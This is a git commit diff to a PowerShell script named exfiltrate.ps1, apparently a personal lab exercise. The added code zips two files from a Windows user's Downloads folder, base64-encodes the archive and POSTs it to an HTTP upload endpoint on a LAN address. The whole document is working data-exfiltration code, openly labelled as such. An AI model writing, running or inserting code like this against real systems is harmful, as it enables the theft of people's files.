4076501f631eb0aebedce941cf7c2d23bed77003
CauaS1 <semnet2404@gmail.com>
2026-08-19 14:15:27 -0300

    simple "read the file, zip it and the exfiltrate" function

--- exfiltrate.ps1
+++ exfiltrate.ps1
@@ -1,5 +1,18 @@
-﻿Invoke-WebRequest `
+﻿Compress-Archive `
+    -Path "C:\Users\semne\Downloads\file1.txt",
+          "C:\Users\semne\Downloads\file2.txt" `
+    -DestinationPath "C:\Users\semne\Downloads\HarmlessFolder\payload.zip"
+
+$file = [System.IO.File]::ReadAllBytes("C:\Users\semne\Downloads\HarmlessFolder\payload.zip")
+$encoded = [Convert]::ToBase64String($file)
+#$encoded | Set-Content "C:\Users\semne\Downloads\HarmlessFolder\encoded.txt" -NoNewline
+
+
+#$encodedText = Get-Content "C:\Users\semne\Downloads\HarmlessFolder\encoded.txt"
+#Write-Output = $encodedText
+
+Invoke-WebRequest `
     -Uri "http://192.168.1.3:5000/upload" `
     -Method POST `
-    -Body "Here is the data that will be encoded ready for exfiltration" `
+    -Body $encoded`
     -ContentType "text/plain"
